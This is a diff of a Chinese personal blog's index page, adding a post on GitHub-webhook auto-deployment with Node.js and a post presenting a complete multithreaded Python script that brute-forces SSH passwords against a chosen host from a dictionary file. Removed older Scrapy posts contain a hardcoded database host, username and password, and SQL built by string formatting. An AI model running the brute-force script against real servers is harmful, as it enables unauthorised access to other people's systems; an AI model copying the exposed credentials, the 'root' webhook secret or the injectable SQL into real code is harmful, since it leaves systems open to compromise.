@@ -126,6 +126,240 @@
 	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
 		<div class="meta">
 			<div class="date">
+				<time datetime="2016-07-02T19:09:49+08:00" itemprop="datePublished">2016/7/2</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='linux.html'>Linux</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="14945009892942.html" itemprop="url">
+		利用Github的Webhook功能和Node.js完成项目的自动部署</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<p><u>本文对任何提供Webhook的git仓库都适用</u></p>
+
+<p><img src="https://pic.mylonly.com/2016-06-29_14635623250348.jpg" alt="2016-06-29_14635623250348.jpg"/></p>
+
+<h3 id="toc_0">首先完成Node.js服务器的代码构建，先上代码，再解释</h3>
+
+<pre><code class="language-Node.js">var http = require(&#39;http&#39;)
+var createHandler = require(&#39;github-webhook-handler&#39;)
+var handler = createHandler({ path: &#39;/&#39;, secret: &#39;root&#39; })
+// 上面的 secret 保持和 GitHub 后台设置的一致
+
+function run_cmd(cmd, args, callback) {
+  var spawn = require(&#39;child_process&#39;).spawn;
+  var child = spawn(cmd, args);
+  var resp = &quot;&quot;;
+
+  child.stdout.on(&#39;data&#39;, function(buffer) { resp += buffer.toString(); });
+  child.stdout.on(&#39;end&#39;, function() { callback (resp) });
+}
+
+http.createServer(function (req, res) {
+  handler(req, res, function (err) {
+    res.statusCode = 404
+    res.end(&#39;no such location&#39;)
+  })
+}).listen(7777)
+
+handler.on(&#39;error&#39;, function (err) {
+  console.error(&#39;Error:&#39;, err.message)
+})
+
+handler.on(&#39;push&#39;, function (event) {
+  console.log(&#39;Received a push event for %s to %s&#39;,
+    event.payload.repository.name,
+    event.payload.ref);
+    run_cmd(&#39;sh&#39;, [&#39;./deploy.sh&#39;,event.payload.repository.name], function(text){ console.log(text) });
+})
+</code></pre>
+
+<p>上面的代码中用到了一个<code>github-webhook-handler</code>的中间价，你可以用<code>npm install -g github-webhook-handler</code>来全局安装</p>
+
+<p>还有代码这行:<br/>
+<code><br/>
+var handler = createHandler({ path: &#39;/&#39;, secret: &#39;root&#39; }) <br/>
+</code><br/>
+其中secret后的参数是你在github的项目中添加webhook时设置的secret值，替换成自己的就行了</p>
+
+<h3 id="toc_1">完成deploy.sh脚本</h3>
+
+<p>deploy.sh脚本负责进入项目的目录，然后利用git命令拉取最新的代码，还是直接贴代码:</p>
+
+<pre><code class="language-Bash"> #!/bin/bash
+
+WEB_PATH=&#39;/root/tools/&#39;$1
+WEB_USER=&#39;root&#39;
+WEB_USERGROUP=&#39;root&#39;
+
+echo &quot;Start deployment&quot;
+cd $WEB_PATH
+echo &quot;pulling source code...&quot;
+git reset --hard origin/master
+git clean -f
+git pull
+git checkout master
+echo &quot;changing permissions...&quot;
+chown -R $WEB_USER:$WEB_USERGROUP $WEB_PATH
+echo &quot;Finished.&quot;
+</code></pre>
+
+<p>deploy.sh 会接受第一个参数当做项目名字，然后进入这个项目的目录执行git操作，这个参数是在deploy.js中根据hook返回的项目名字来的，代码应该比较容易懂，都是些简单的git命令。</p>
+
+<blockquote>
+<p>如果是全新的项目，需要在你的服务器上先clone要部署的项目<br/>
+你需要根据自己的实际项目位置，修改WEB_PATH的值</p>
+</blockquote>
+
+<h3 id="toc_2">后台运行deploy.js</h3>
+
+<p>利用Linux提供的nohup命令，让deploy.js运行在后台</p>
+
+<pre><code>nohup node deploy.js &gt; deploy.log &amp;
+</code></pre>
+
+<h3 id="toc_3">去Github后台添加webhook</h3>
+
+<p>进入你需要自动部署的项目的github地址，进入项目的设置页面，点击左侧的<code>Webhooks &amp; services</code><br/>
+<img src="https://pic.mylonly.com/2016-06-29_14635620989191.jpg" alt="2016-06-29_14635620989191.jpg"/></p>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2016-06-24T19:12:26+08:00" itemprop="datePublished">2016/6/24</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='python.html'>Python</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="14945011465578.html" itemprop="url">
+		利用pxssh暴力破解ssh密码</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<blockquote>
+<p><mark>关于pxssh</mark><br/>
+pxssh 是一个包含了pexpect库的专用脚本,它已经预先为我们写好了login(),logout()和prompt()等函数直接与SSH交互。</p>
+</blockquote>
+
+<h4 id="toc_0">利用pxssh的login函数判断密码是否正确</h4>
+
+<p>由于pxssh.login()函数执行失败会抛出异常，因此我们可以利用try...catch来捕获相应的异常来判断密码是否正确。（PS:其中的connection_lock.release()是信号量得释放操作）</p>
+
+<pre><code class="language-Python">def connect(host,user,password):
+    try:
+        session = pxssh.pxssh()
+        session.login(host,user,password)
+        print(&#39;[+]Password Found:&#39;+password)
+    except Exception,e:
+        print (&#39;[-] Error Connecting:&#39;+str(e))
+    finally:
+        connection_lock.release()
+</code></pre>
+
+<h4 id="toc_1">多线程和信号量</h4>
+
+<p>由于我们准备从一个庞大的字典文件的读取密码，我们决定利用多线程来同时处理多个密码登陆操作用来加快速度。</p>
+
+<pre><code class="language-Python">password_file = open(password,&#39;r&#39;)
+for line in password_file:
+        thread = threading.Thread(target=connect,args=(host,user,password))
+        thread.start()
+</code></pre>
+
+<p>可是像上面的代码,如果password_file是个巨大的密码文件，就为同时产生过多的线程，很容易造成服务器无法响应，为了控制同时存在的线程数量，我们这里采用threading中的BoundedSemaphore来控制最大连接数，也就是最多的允许线程数量,讲上面的代码改成如下这样:</p>
+
+<pre><code class="language-Python">maxConnections = 5
+connection_lock = threading.BoundedSemaphore(maxConnections)
+password_file = open(password,&#39;r&#39;)
+for line in password_file:
+   password = line.strip(&#39;\r&#39;).strip(&#39;\n&#39;)
+   connection_lock.acquire()
+   print(&#39;[-] Testing password:&#39;+str(password))
+   thread = threading.Thread(target=connect,args=(host,user,password))
+   thread.start()
+</code></pre>
+
+<p>最大连接数被设置为5，在每个thread启动时注册一个信号量，在connect函数结束时注销这个信号量，这样同时存在的线程数量就被控制为5个。</p>
+
+<h4 id="toc_2">测试结果</h4>
+
+<p><img src="https://pic.mylonly.com/2016-06-29_14667836697742.jpg" alt="2016-06-29_14667836697742.jpg"/><br/>
+字典文件可以自己生成，或者网上找一些常用字典文件</p>
+
+<h4 id="toc_3">完整代码</h4>
+
+<pre><code class="language-Python">from pexpect import pxssh
+import threading
+import optparse
+import time
+
+maxConnections = 5
+connection_lock = threading.BoundedSemaphore(maxConnections)
+
+def send_command(child,cmd):
+    child.sendline(cmd)
+    child.prompt()
+    print(child.before)
+
+def connect(host,user,password):
+    try:
+        session = pxssh.pxssh()
+        session.login(host,user,password)
+        print(&#39;[+]Password Found:&#39;+password)
+    except Exception,e:
+        print (&#39;[-] Error Connecting:&#39;+str(e))
+    finally:
+        connection_lock.release()
+
+def main():
+    
+    parse = optparse.OptionParser(&#39;Usage %prog &#39;+ \
+        &#39;-H &lt;target host&gt; -u &lt;user&gt; -F &lt;password file&gt;&#39;)
+    parse.add_option(&#39;-H&#39;,dest=&#39;host&#39;,type=&#39;string&#39;,help=&#39;specify target host&#39;)
+    parse.add_option(&#39;-u&#39;,dest=&#39;user&#39;,type=&#39;string&#39;,help=&#39;specify username&#39;)
+    parse.add_option(&#39;-F&#39;,dest=&#39;password&#39;,type=&#39;string&#39;,help=&#39;specify password file&#39;)
+    (options,args) = parse.parse_args()
+
+    host = options.host
+    user = options.user
+    password = options.password
+
+    password_file = open(password,&#39;r&#39;)
+
+    for line in password_file:
+        password = line.strip(&#39;\r&#39;).strip(&#39;\n&#39;)
+        connection_lock.acquire()
+        print(&#39;[-] Testing password:&#39;+str(password))
+        thread = threading.Thread(target=connect,args=(host,user,password))
+        thread.start()
+
+if __name__ == &#39;__main__&#39;:
+    main()
+
+</code></pre>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
 				<time datetime="2016-06-24T19:11:42+08:00" itemprop="datePublished">2016/6/24</time>
 			</div>
 			<div class="tags">posted in 
@@ -546,251 +780,6 @@ class zhihuSpider(CrawlSpider):
 </code></pre>
 
 <p>将locale的值改为en-US之后重启VSCode就恢复到英文版本的了!</p>
-
-
-			
-			
-		</div>
-
-	</article>
- 
-	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
-		<div class="meta">
-			<div class="date">
-				<time datetime="2016-05-11T19:12:34+08:00" itemprop="datePublished">2016/5/11</time>
-			</div>
-			<div class="tags">posted in 
-			
-			    <a class='category' href='python.html'>Python</a>&nbsp;
-			 
-			</div>
-		</div>
-		<h1 class="title" itemprop="name"><a href="14945011548149.html" itemprop="url">
-		简单Scrapy爬虫</a></h1>
-		<div class="entry-content" itemprop="articleBody">
-			
-			<p>只是个小小的demo，自己测试了下，总共down了20几张图片</p>
-
-<pre><code class="language-Python">#coding: utf-8 #############################################################
-# File Name: spiders/wallpaper.py
-# Author: mylonly
-# mail: tianxianggen@gmail.com
-#Blog:www.mylonly.com
-# Created Time: 2014年09月01日 星期一 14时20分07秒
-#########################################################################
-#!/usr/bin/python
-import urllib2
-import os
- 
-from scrapy.contrib.spiders import CrawlSpider,Rule
-from scrapy.contrib.linkextractors.sgml import SgmlLinkExtractor
-from scrapy.selector import Selector
-from mylonly.items import wallpaperItem
-from scrapy.http import Request
- 
-class wallpaper(CrawlSpider):
-    name = &quot;wallpaperSpider&quot;
-    allowed_domains = [&#39;sj.zol.com.cn&#39;]
-    start_urls = [&#39;http://sj.zol.com.cn/&#39;]
-    number = 0
-    rules = (
-    Rule(SgmlLinkExtractor(allow = (&#39;detail_\d{4}_\d{5}\.html&#39;)),callback =     &#39;parse_image&#39;,follow=True),)
-    def parse_image(self,response):
-        self.log(&#39;hi,this is an item page! %s&#39; % response.url)
-        sel = Selector(response)
-        sites = sel.xpath(&quot;//div[@class=&#39;wrapper        mt15&#39;]//dd[@id=&#39;tagfbl&#39;]//a[@target=&#39;_blank&#39;]/@href&quot;).extract()
-        for site in sites:
-        url = &#39;http://sj.zol.com.cn%s&#39; % (site)
-        print &#39;one page:&#39;,url
-        return Request(url,callback = self.parse_href)
-    def parse_href(self,response):
-        print &#39;I am in:&#39;,response.url
-        sel = Selector(response)
-        src = sel.xpath(&quot;//body//img/@src&quot;).extract()[0]
-        self.download(src)
- 
-    def download(self,url):
-        self.number += 1
-        savePath = &#39;/mnt/python_image/%d.jpg&#39; % (self.number)
-        print &#39;正在下载...&#39;,url
-        try:
-            u = urllib2.urlopen(url)
-            r = u.read()
-            downloadFile = open(savePath,&#39;wb&#39;)
-            downloadFile.write(r)
-            u.close()
-            downloadFile.close()
-        except:
-            print savePath,&#39;can not download.&#39;
- 
-</code></pre>
-
-
-			
-			
-		</div>
-
-	</article>
- 
-	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
-		<div class="meta">
-			<div class="date">
-				<time datetime="2016-05-11T19:11:56+08:00" itemprop="datePublished">2016/5/11</time>
-			</div>
-			<div class="tags">posted in 
-			
-			    <a class='category' href='python.html'>Python</a>&nbsp;
-			 
-			</div>
-		</div>
-		<h1 class="title" itemprop="name"><a href="14945011166438.html" itemprop="url">
-		Scrapy——crawlSpider爬虫</a></h1>
-		<div class="entry-content" itemprop="articleBody">
-			
-			<p>Scrapy中的BaseSpider爬虫类只能抓取start_urls中提供的链接，而利用Scrapy提供的crawlSpider类可以很方便的自动解析网页上符合要求的链接，从而达到爬虫自动抓取的功能。<br/>
- <br/>
-要利用crawSpider和BaseSpider的区别在于crawSpider提供了一组Rule对象列表，这些Rule对象规定了爬虫抓取链接的行为，Rule规定的链接才会被抓取，交给相应的callback函数去处理。<br/>
-  <br/>
-在rules中通过SmglLinkExtractor提取希望获取的链接。<br/>
- <br/>
-我此次的demo中rule只有一个，如下：</p>
-
-<pre><code class="language-python">allowed_domains = [&#39;sj.zol.com.cn&#39;]
-start_urls = [&#39;http://sj.zol.com.cn/bizhi/&#39;]
-number = 0
-rules = (
-            Rule(SgmlLinkExtractor(allow = (&#39;detail_\d{4}_\d{5}\.html&#39;)),callback = &#39;parse_image&#39;,follow=True),
-            )
-</code></pre>
-
-<p>搜索起始链接下面符合allow中正则表达式的链接，并跟进解析，如果follow = False，则只会解析起始链接中找到的符合要求的链接<br/>
- <br/>
-SmglLinkExtractor主要参数：<br/>
- <br/>
-- allow：满足括号中“正则表达式”的值会被提取，如果为空，则全部匹配。<br/>
-- deny：与这个正则表达式(或正则表达式列表)不匹配的URL一定不提取。<br/>
-- allow_domains：会被提取的链接的domains。<br/>
-- deny_domains：一定不会被提取链接的domains。<br/>
-- restrict_xpaths：使用xpath表达式，和allow共同作用过滤链接。<br/>
- <br/>
-下面的内容就是利用Selector解析获得的response并赋值个item就行了：</p>
-
-<pre><code class="language-python">#coding: utf-8 #############################################################
-# File Name: spiders/wallpaper.py
-# Author: mylonly
-# mail: tianxianggen@gmail.com
-#Blog:www.mylonly.com
-# Created Time: 2014年09月01日 星期一 14时20分07秒
-#########################################################################
-#!/usr/bin/python
-import urllib2
-import os
-import re
- 
-from scrapy.contrib.spiders import CrawlSpider,Rule
-from scrapy.contrib.linkextractors.sgml import SgmlLinkExtractor
-from scrapy.selector import Selector
-from mylonly.items import wallpaperItem
-from scrapy.http import Request
- 
-class wallpaper(CrawlSpider):
-        name = &quot;wallpaperSpider&quot;
-        allowed_domains = [&#39;sj.zol.com.cn&#39;]
-        start_urls = [&#39;http://sj.zol.com.cn/bizhi/&#39;]
-        number = 0
-        rules = (
-                        Rule(SgmlLinkExtractor(allow = (&#39;detail_\d{4}_\d{5}\.html&#39;)),callback = &#39;parse_image&#39;,follow=True),
-                        )
-        def parse_image(self,response):
-                self.log(&#39;hi,this is an item page! %s&#39; % response.url)
-                sel = Selector(response)
-                sites = sel.xpath(&quot;//div[@class=&#39;wrapper mt15&#39;]//dd[@id=&#39;tagfbl&#39;]//a[@target=&#39;_blank&#39;]/@href&quot;).extract()       
-                for site in sites:
-                        url = &#39;http://sj.zol.com.cn%s&#39; % (site)
-                        print &#39;one page:&#39;,url
-                        item = wallpaperItem()
-                        item[&#39;size&#39;] = re.search(&#39;\d*x\d*&#39;,site).group()
-                        item[&#39;altInfo&#39;] = sel.xpath(&quot;//h1//a/text()&quot;).extract()[0]
-                        return Request(url,meta = {&#39;item&#39;:item},callback = self.parse_href)
-        def parse_href(self,response):
-                print &#39;I am in:&#39;,response.url
-                item = response.meta[&#39;item&#39;]
-                items = []
-                sel = Selector(response)
-                src = sel.xpath(&quot;//body//img/@src&quot;).extract()[0]
-                item[&#39;imgSrc&#39;] = src
-                items.append(item)
-                return items
-                #self.download(src)
-        def download(self,url):
-                self.number += 1
-                savePath = &#39;/mnt/python_image/%d.jpg&#39; % (self.number)
-                print &#39;正在下载...&#39;,url
-                try:
-                        u = urllib2.urlopen(url)
-                        r = u.read()
-                        downloadFile = open(savePath,&#39;wb&#39;)
-                        downloadFile.write(r)
-                        u.close()
-                        downloadFile.close()
-                except:
-                        print savePath,&#39;can not download.&#39;
-</code></pre>
-
-<p> <br/>
- <br/>
- <br/>
-接下来看看我的Item.py的代码：</p>
-
-<pre><code class="language-python">class wallpaperItem(scrapy.Item):
-        size = scrapy.Field()
-        altInfo = scrapy.Field()
-        imgSrc = scrapy.Field()
-</code></pre>
-
-<p> <br/>
-还有pipilines.py:</p>
-
-<pre><code class="language-python"># -*- coding: utf-8 -*-
- 
-# Define your item pipelines here
-#
-# Don&#39;t forget to add your pipeline to the ITEM_PIPELINES setting
-# See: http://doc.scrapy.org/en/latest/topics/item-pipeline.html
-import MySQLdb
- 
- 
-class MylonlyPipeline(object):
-    def process_item(self, item, spider):
-        return item
- 
-class wallpaperPipeline(object):
-        def process_item(self,item,spider):
-                print &#39;imgSrc:&#39;,item[&#39;imgSrc&#39;]
-                db = MySQLdb.connect(&quot;rdsauvva2auvva2.mysql.rds.aliyuncs.com&quot;,&quot;mylonly&quot;,&quot;703003659txg&quot;,&quot;wallpaper&quot;)
-                cursor = db.cursor()
-                db.set_character_set(&#39;utf8&#39;)
-                cursor.execute(&#39;SET NAMES utf8;&#39;)
-                cursor.execute(&#39;SET CHARACTER SET utf8;&#39;)
-                cursor.execute(&#39;SET character_set_connection=utf8;&#39;)
- 
-                sql =&quot;INSERT INTO mobile_download(wallpaper_size,wallpaper_info,wallpaper_src)\
-                      VALUES(&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;)&quot;%(item[&#39;size&#39;],item[&#39;altInfo&#39;],item[&#39;imgSrc&#39;])
-                try:
-                        print sql
-                        cursor.execute(sql)
-                        db.commit()
-                except MySQLdb.Error,e:
-                        print &quot;Mysql Error %d: %s&quot; % (e.args[0], e.args[1])
-                db.close()
-                return item
-</code></pre>
-
-<p> <br/>
- <br/>
- <br/>
-本例中我将传回的items数据存放到了数据库中，如果你不想这样，可以将我注释掉的self.download()取消注释，不反悔items，就可以将找到的所有图片链接全部下载下来，不过要找个大点的地方存储，因为总共有5W多条：<br/>
-<img src="https://pic.mylonly.com/2016-06-29_061712481319744.png" alt="2016-06-29_061712481319744.png"/></p>
 
 
 			
